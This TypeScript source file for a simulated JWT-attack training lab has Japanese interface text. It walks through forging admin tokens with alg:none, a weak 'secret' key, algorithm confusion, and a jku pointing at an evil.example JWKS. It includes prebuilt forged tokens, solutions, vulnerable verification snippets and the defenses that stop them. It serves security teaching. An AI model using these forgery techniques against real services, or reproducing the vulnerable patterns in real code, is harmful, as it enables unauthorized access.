import type { AttackResult, Lab, LabInput, Level, LevelSpec } from "./types";
import { traced } from "./trace";

const te = new TextEncoder();

/** SHA-256 (sync) so HS256 can be verified in the browser without SubtleCrypto. */
function sha256(bytes: Uint8Array): Uint8Array {
  const K = [
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
  ];
  const rr = (x: number, n: number) => (x >>> n) | (x << (32 - n));
  const len = bytes.length;
  const bitLen = len * 8;
  const padLen = ((len + 9 + 63) & ~63) - len;
  const padded = new Uint8Array(len + padLen);
  padded.set(bytes);
  padded[len] = 0x80;
  const view = new DataView(padded.buffer);
  view.setUint32(padded.length - 4, bitLen >>> 0, false);
  let h0 = 0x6a09e667, h1 = 0xbb67ae85, h2 = 0x3c6ef372, h3 = 0xa54ff53a;
  let h4 = 0x510e527f, h5 = 0x9b05688c, h6 = 0x1f83d9ab, h7 = 0x5be0cd19;
  const w = new Uint32Array(64);
  for (let i = 0; i < padded.length; i += 64) {
    for (let t = 0; t < 16; t++) w[t] = view.getUint32(i + t * 4, false);
    for (let t = 16; t < 64; t++) {
      const s0 = rr(w[t - 15], 7) ^ rr(w[t - 15], 18) ^ (w[t - 15] >>> 3);
      const s1 = rr(w[t - 2], 17) ^ rr(w[t - 2], 19) ^ (w[t - 2] >>> 10);
      w[t] = (w[t - 16] + s0 + w[t - 7] + s1) >>> 0;
    }
    let a = h0, b = h1, c = h2, d = h3, e = h4, f = h5, g = h6, h = h7;
    for (let t = 0; t < 64; t++) {
      const S1 = rr(e, 6) ^ rr(e, 11) ^ rr(e, 25);
      const ch = (e & f) ^ (~e & g);
      const t1 = (h + S1 + ch + K[t] + w[t]) >>> 0;
      const S0 = rr(a, 2) ^ rr(a, 13) ^ rr(a, 22);
      const maj = (a & b) ^ (a & c) ^ (b & c);
      const t2 = (S0 + maj) >>> 0;
      h = g; g = f; f = e; e = (d + t1) >>> 0;
      d = c; c = b; b = a; a = (t1 + t2) >>> 0;
    }
    h0 = (h0 + a) >>> 0; h1 = (h1 + b) >>> 0; h2 = (h2 + c) >>> 0; h3 = (h3 + d) >>> 0;
    h4 = (h4 + e) >>> 0; h5 = (h5 + f) >>> 0; h6 = (h6 + g) >>> 0; h7 = (h7 + h) >>> 0;
  }
  const out = new Uint8Array(32);
  const ov = new DataView(out.buffer);
  ov.setUint32(0, h0); ov.setUint32(4, h1); ov.setUint32(8, h2); ov.setUint32(12, h3);
  ov.setUint32(16, h4); ov.setUint32(20, h5); ov.setUint32(24, h6); ov.setUint32(28, h7);
  return out;
}

function hmacSha256(key: Uint8Array, msg: Uint8Array): Uint8Array {
  if (key.length > 64) key = sha256(key);
  const ipad = new Uint8Array(64);
  const opad = new Uint8Array(64);
  ipad.set(key);
  opad.set(key);
  for (let i = 0; i < 64; i++) {
    ipad[i] ^= 0x36;
    opad[i] ^= 0x5c;
  }
  const inner = new Uint8Array(64 + msg.length);
  inner.set(ipad);
  inner.set(msg, 64);
  const hashed = sha256(inner);
  const outer = new Uint8Array(64 + 32);
  outer.set(opad);
  outer.set(hashed, 64);
  return sha256(outer);
}

function bytesToB64Url(bytes: Uint8Array): string {
  let bin = "";
  for (const b of bytes) bin += String.fromCharCode(b);
  return btoa(bin).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
}

export function hmacSha256Base64Url(message: string, secret: string): string {
  return bytesToB64Url(hmacSha256(te.encode(secret), te.encode(message)));
}

export function encodeJwtPart(value: object): string {
  return btoa(JSON.stringify(value)).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_");
}

export function makeJwt(header: object, payload: object, signature: string): string {
  return `${encodeJwtPart(header)}.${encodeJwtPart(payload)}.${signature}`;
}

export function signHs256(header: object, payload: object, secret: string): string {
  const hp = `${encodeJwtPart(header)}.${encodeJwtPart(payload)}`;
  return `${hp}.${hmacSha256Base64Url(hp, secret)}`;
}

export function decodeJwtPart(part: string): Record<string, unknown> | null {
  try {
    const normalized = part.replace(/-/g, "+").replace(/_/g, "/");
    return JSON.parse(atob(normalized.padEnd(Math.ceil(normalized.length / 4) * 4, "=")));
  } catch {
    return null;
  }
}

function verifyHs256(head: string, body: string, signature: string, secret: string): boolean {
  return signature.length > 0 && hmacSha256Base64Url(`${head}.${body}`, secret) === signature;
}

/** Simulated RSA public key material. Lv3 treats this string as an HMAC secret. */
const RSA_PUBLIC = "hacklab-rsa-public";
const HS_SECRET = "secret";
const ATTACKER_JKU = "https://evil.example/jwks.json";
const ATTACKER_HMAC = "evil-hmac-key";
const ADMIN = { sub: "attacker", role: "admin" };

const USER_TOKEN = makeJwt({ alg: "RS256", typ: "JWT", kid: "key-2026" }, { sub: "alice", role: "user" }, "valid-user-signature");
const NONE_TOKEN = makeJwt({ alg: "none", typ: "JWT" }, ADMIN, "");
const WEAK_TOKEN = signHs256({ alg: "HS256", typ: "JWT" }, ADMIN, HS_SECRET);
const CONFUSION_TOKEN = signHs256({ alg: "HS256", typ: "JWT" }, ADMIN, RSA_PUBLIC);
const JKU_TOKEN = signHs256({ alg: "HS256", typ: "JWT", jku: ATTACKER_JKU }, ADMIN, ATTACKER_HMAC);

function describeJwks(jku: unknown): string | null {
  if (typeof jku !== "string" || !jku) return null;
  if (jku === ATTACKER_JKU) {
    const k = bytesToB64Url(te.encode(ATTACKER_HMAC));
    return `JWKS ${jku} : {"keys":[{"kty":"oct","kid":"evil","alg":"HS256","k":"${k}"}]}`;
  }
  return `JWKS fetch failed: ${jku}`;
}

function run(level: Level, input: LabInput): AttackResult {
  const token = (input.token ?? "").trim();
  const [head = "", body = "", signature = ""] = token.split(".");
  const header = decodeJwtPart(head);
  const payload = decodeJwtPart(body);
  if (!header || !payload) {
    return { solved: false, output: ["[401] JWT の形式が不正です。"], note: "header.payload.signature の形式を確認してください。" };
  }

  const isAdmin = payload.role === "admin";
  const isAliceUser = payload.sub === "alice" && payload.role === "user";
  let accepted = false;
  let reason = "";
  if (level === 1) {
    accepted = header.alg === "none" && signature === "" && isAdmin;
    reason = accepted
      ? "alg をトークンから信用し、none を許可しています。"
      : "このエンドポイントは有効な管理者トークンが必要です。";
  } else if (level === 2) {
    accepted = header.alg === "HS256" && verifyHs256(head, body, signature, HS_SECRET) && isAdmin;
    reason = accepted
      ? "署名鍵 `secret` が辞書攻撃で推測され、HMAC-SHA256 が一致しました。"
      : "HMAC が一致しません。";
  } else if (level === 3) {
    accepted = header.alg === "HS256" && verifyHs256(head, body, signature, RSA_PUBLIC) && isAdmin;
    reason = accepted
      ? "RS256 用の公開鍵を HS256 の秘密鍵として使い、HMAC が一致しました。"
      : "HMAC が一致しません。";
  } else if (level === 4) {
    const fromAttackerJwks = header.jku === ATTACKER_JKU && verifyHs256(head, body, signature, ATTACKER_HMAC);
    accepted = header.alg === "HS256" && fromAttackerJwks && isAdmin;
    reason = accepted
      ? "jku から攻撃者 JWKS の oct 鍵を取得し、その HMAC で検証しました。"
      : "署名を検証できませんでした。";
  } else {
    reason = "固定アルゴリズム・許可済み kid・信頼済み鍵による署名検証で拒否しました。";
  }

  const jwksLine = level >= 4 ? describeJwks(header.jku) : null;
  const foundJwks = level === 4 && header.jku === ATTACKER_JKU;
  const loot = foundJwks
    ? [{ id: "jwt-oct", label: "JWKS oct 鍵 (decoded)", value: ATTACKER_HMAC }]
    : undefined;
  return traced(
    {
      solved: accepted,
      benign: !accepted && isAliceUser,
      progress: !accepted && !isAliceUser && foundJwks,
      output: [
        `header : ${JSON.stringify(header)}`,
        `payload: ${JSON.stringify(payload)}`,
        ...(jwksLine ? [jwksLine] : []),
        accepted
          ? `[200 OK] /admin — ${String(payload.sub)} (admin)`
          : isAliceUser
            ? `[403 FORBIDDEN] /admin は role=admin が必要です。`
            : `[401 INVALID TOKEN]`,
      ],
      note: accepted
        ? "改ざんした JWT で管理者権限を取得しました。"
        : isAliceUser
          ? "alice のトークンとして認識しました。この API は管理者専用です。"
          : reason,
    },
    accepted
      ? level === 1
        ? `alg=none → 署名検証をスキップ`
        : `HMAC-SHA256(header.payload) 検証成功`
      : level === 1
        ? `alg=${String(header.alg ?? "?")}`
        : `HMAC-SHA256(header.payload)`,
    {
      recap: accepted
        ? level === 4
          ? ["jku から攻撃者 JWKS を取った", "oct 鍵で HMAC が一致した", "role=admin で /admin が開いた"]
          : level === 3
            ? ["alg を HS256 にした", "公開鍵を HMAC 秘密として使った", "role=admin で /admin が開いた"]
            : ["トークンの alg / 鍵をすり替えられた", "サーバーが改ざんトークンを受け入れた"]
        : undefined,
      loot,
    },
  );
}

const levels: Record<Level, LevelSpec> = {
  1: {
    defense: "JWT の alg を信用し、`none`（署名なし）を許可する。",
    hints: [
      "JWT は `header.payload.signature` の 3 部分です。",
      "header の alg を `none` にして、署名部分を空にするとどうなりますか？",
      "payload の role を admin に変更した `alg:none` トークンを送ります。",
    ],
    solution: `署名なしのトークンを送信します:\n\`${NONE_TOKEN}\``,
    code: `const header = decode(token.header);
if (header.alg === "none") return decode(token.payload); // 禁止すべき`,
  },
  2: {
    defense: "`none` は拒否するが、HS256 の秘密鍵に推測可能な `secret` を使う。",
    hints: [
      "署名があっても、共有秘密鍵が弱ければオフラインで HMAC を計算できます。",
      "よく使われる鍵 `secret` が辞書から見つかりました。",
      "header.alg を HS256、payload.role を admin にし、「HS256 で署名」に `secret` を入れて送ります。",
    ],
    solution: `弱い鍵 \`secret\` で HMAC-SHA256 署名したトークン:\n\`${WEAK_TOKEN}\``,
    code: `jwt.verify(token, "secret", { algorithms: ["HS256"] }); // 推測可能な固定鍵`,
  },
  3: {
    defense: "none と弱い HMAC 鍵を拒否し RS256 で検証する。ただし header の alg を信用する。",
    hints: [
      "弱い鍵 `secret` では HMAC が一致しません。ソースは公開鍵で検証しています。",
      "ライブラリが alg をトークンから読むと、非対称の公開鍵を HMAC の秘密に使えませんか？",
      "alg を HS256 にし、「HS256 で署名」の鍵に公開鍵文字列 `hacklab-rsa-public` を入れます。",
    ],
    solution: `公開鍵を HMAC 秘密にしたトークン:\n\`${CONFUSION_TOKEN}\``,
    code: `const key = fs.readFileSync("public.pem"); // RSA 公開鍵
jwt.verify(token, key); // algorithms を固定していない
// alg=HS256 だと公開鍵が HMAC 秘密になる`,
  },
  4: {
    defense: "弱い secret と公開鍵 HMAC を拒否する。検証鍵は header の jku が指す JWKS から取る。",
    hints: [
      "公開鍵を HMAC に使う混同は拒否されます。鍵はどこから来ますか？",
      "header に `jku: https://evil.example/jwks.json` を付けると、取得した JWKS がログに出ます。",
      "JWKS の `k` は Base64url です。デコードした oct 鍵で HS256 署名し、role=admin にします。",
    ],
    solution: `攻撃者 JWKS の oct 鍵で HMAC したトークン:\n\`${JKU_TOKEN}\`\n秘密鍵は \`${ATTACKER_HMAC}\`（jku ログの k をデコード）です。`,
    code: `const jwks = await fetch(header.jku); // 許可リストなし
jwt.verify(token, jwks.keys[0]); // kty を見ず oct 鍵でも HMAC する`,
  },
  5: {
    defense: "アルゴリズムを固定し、kid を許可リストで選び、信頼済み鍵で全クレームを検証する。",
    hints: [
      "署名だけでなく iss・aud・exp も検証し、鍵選択を入力任せにしません。",
      "信頼済み秘密鍵を持たない攻撃者は admin トークンを作れないため、突破不可能です。",
    ],
    solution: "突破不可能です。固定アルゴリズムと信頼済み鍵で署名・issuer・audience・期限を検証します。",
    code: `jwt.verify(token, trustedKeys[allowedKid], {
  algorithms: ["RS256"], issuer: ISSUER, audience: AUDIENCE
});`,
  },
};

export const jwtLab: Lab = {
  meta: {
    id: "jwt",
    title: "JWT — 管理者トークンの偽造",
    shortTitle: "JWT",
    category: "認証トークン",
    objective: "JWT を解析・改ざんし、管理者専用 API へアクセスする。",
    summary: "alg:none、弱い鍵、アルゴリズム混同、jku からの鍵取得を段階的に試す。",
    standards: {
      owasp: {
        code: "A07:2021",
        name: "Identification and Authentication Failures",
        url: "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/",
      },
      cwe: [
        { id: 347, name: "Improper Verification of Cryptographic Signature" },
        { id: 321, name: "Use of Hard-coded Cryptographic Key" },
      ],
    },
    references: [
      { title: "OWASP JSON Web Token Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html" },
      { title: "PortSwigger — JWT attacks", url: "https://portswigger.net/web-security/jwt" },
    ],
  },
  fields: [{ name: "token", label: "Authorization: Bearer", default: USER_TOKEN, multiline: true, mono: true }],
  explanation: `JWT は署名付きのトークン形式であり、暗号化ではありません。header と payload は誰でも読んで変更できます。安全性は、サーバーが期待するアルゴリズムを固定し、信頼済み鍵で署名を正しく検証することに依存します。

トークン自身が宣言する alg を信用せず、検証アルゴリズムをサーバー側で固定します。HMAC 鍵には十分なランダム性を持たせ、公開鍵を HMAC 秘密に使わないようにします。鍵の取得先（kid / jku / x5u）は許可リストから選び、任意 URL やパスへは取りに行きません。署名に加えて issuer、audience、期限などのクレームも検証します。`,
  levels,
  run,
  exploits: {
    1: { token: NONE_TOKEN },
    2: { token: WEAK_TOKEN },
    3: { token: CONFUSION_TOKEN },
    4: { token: JKU_TOKEN },
  },
};
